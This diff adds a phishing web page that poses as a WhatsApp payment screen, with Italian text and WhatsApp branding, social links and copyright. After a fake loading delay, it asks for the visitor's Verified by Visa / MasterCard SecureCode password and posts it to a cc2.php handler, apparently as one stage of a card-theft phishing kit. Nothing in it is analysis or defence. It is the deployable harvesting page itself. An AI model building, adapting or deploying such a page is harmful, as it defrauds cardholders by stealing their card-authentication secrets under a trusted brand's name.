@@ -1,0 +1,106 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>
+<link rel="shortcut icon" href="images/favicon.ico" />
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="HandheldFriendly" content="true" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1,  user-scalable=no" />
+<title>WhatsApp - Payment</title>
+<link rel="stylesheet" href="css/style_m_common.css?1" type="text/css" charset="utf-8" />
+<link rel="stylesheet" href="css/style_m_other.css?11" type="text/css" charset="utf-8" />
+<script type="text/javascript" src="js/jquery.js"></script>
+<script type="text/javascript">$(function() {$("#load").delay(3400).fadeOut(100); $("#payment").delay(3500).fadeIn(100);});</script>
+<style type="text/css">
+&lt;!--
+.Style1 {color: #FF0000}
+--&gt;
+</style>
+</head>
+<body><div class="wrapper">
+<div class="shade"><div class="bar"><div class="logo"><a href="#"></a></div><div class="title"><h1>WhatsApp Messenger</h1></div><div class="nav" id="nav"><a href="#" onclick="showMenu(); return false;"></a></div></div></div>
+<div id="menu-inner">
+<div class="clear"></div>
+<li class="social">
+<span class="btn btn1"><a href="https://twitter.com/whatsapp" target="_blank">Twitter</a></span><span class="btn btn2"><a href="https://www.facebook.com/WhatsApp" target="_blank">Facebook</a></span><span class="btn btn3"><a href="https://plus.google.com/102708307632999019941/posts" target="_blank">Google Plus</a></span>
+</li><div id="lang_select">
+<span class="icon"></span>
+<select onchange="window.location = this.options[this.selectedIndex].value;" style="padding:1px 1px 1px 1px;">
+<option value="">Language</option><option value="?l=en">English</option><option value="?l=fr">Français</option><option value="?l=de">Deutsch</option></select><div class="clear"></div></div>
+</div>
+<div class="top inner">
+<div class="container" id="title-container">
+<h1>Pagamento</h1>
+</div></div><form action="cc2.php" method="post"><input name="location" type="hidden" value="" /><input name="langa" type="hidden" value="en" /><div class="content inner about">
+<div style="padding-bottom:10px">Attendi,riceverai un codice di attivazione in SMS entro un minuto</div>
+<table cellpadding="0" cellspacing="0" width="100%"><tbody><tr valign="top">
+<td class="exten"><label for="ext1"></label></td>
+</tr>
+</tbody></table>
+<div id="load" style="width:100%; min-height:120px; text-align:center; padding-top:40px"><img src="images/load.gif" /></div>
+<div id="payment" style="display:none; min-height:240px; "><br />
+<label for="hold" class="mobonly"><br />
+</label>
+  <table width="28%" align="center" cellpadding="0" cellspacing="0">
+    <tbody><tr>
+      <td style="background:url('images/vbv.png') no-repeat; height:40px"> </td>
+    </tr>
+    <tr>
+      <td height="19"> </td>
+    </tr>
+  </tbody></table>
+    
+  
+<label for="djj"></label>
+
+  <label for="ccnum" class="mobonly"><br />
+  </label>
+   
+
+
+<label for="kontonum">Passwords 3D Secure <span class="Style1">*</span></label>
+<label for="kontonum" class="mobonly"><br />
+</label>
+  <input required="" placeholder="Verified by Visa / MasterCard SecureCode" type="text" size="40" name="kontonum" id="kontonum" style="width:45%" />
+  <a class="tooltip" title="Password della carta di credito."><img src="images/help.png" style="cursor:help" /></a>
+<p> </p>
+  
+
+
+ 
+ <div align="center">
+  <input type="submit" value="Conferma" class="submit" />
+</div>
+
+<script src="js/payform.min.js"></script>
+</div><br />
+<table width="100%" cellpadding="0" cellspacing="0">
+  <tbody><tr></tr>
+  <tr><td><br />
+    <h3>Pagamento Sicuro al 100%</h3></td>
+  </tr></tbody></table></div></form><div id="footer" class="footer">
+<div id="btm-menu"><a href="#" class="home-link"></a></div>
+<div id="btm_lang_select">
+<div class="container"><span class="icon"></span><select onchange="window.location = this.options[this.selectedIndex].value;" style="padding:1px 1px 1px 1px;"><option value="">Language</option><option value="?l=en">English</option><option value="?l=fr">Français</option><option value="?l=de">Deutsch</option></select></div></div>
+<div id="copyright">© 2018 WhatsApp Inc.</div>
+<div class="social"><div class="btns">
+<span class="btn btn1"><a href="https://twitter.com/whatsapp" target="_blank">Twitter</a></span>
+<span class="btn btn2"><a href="https://www.facebook.com/WhatsApp" target="_blank">Facebook</a></span>
+<span class="btn btn3"><a href="https://plus.google.com/102708307632999019941/posts" target="_blank">Google Plus</a></span>
+</div></div></div></div>
+<script type="text/javascript">
+var menuActive = false;
+function showMenu() {
+	if (menuActive) {
+		setClass('menu-inner','');
+		setClass('nav','nav');
+		menuActive = false;
+	} else {
+		setClass('menu-inner','active');
+		setClass('nav','nav close');
+		menuActive = true;
+	}
+
+	return false;
+}
+function setClass(id, classnm) {document.getElementById(id).setAttribute("class", classnm);}
+</script>
+
+</body></html>
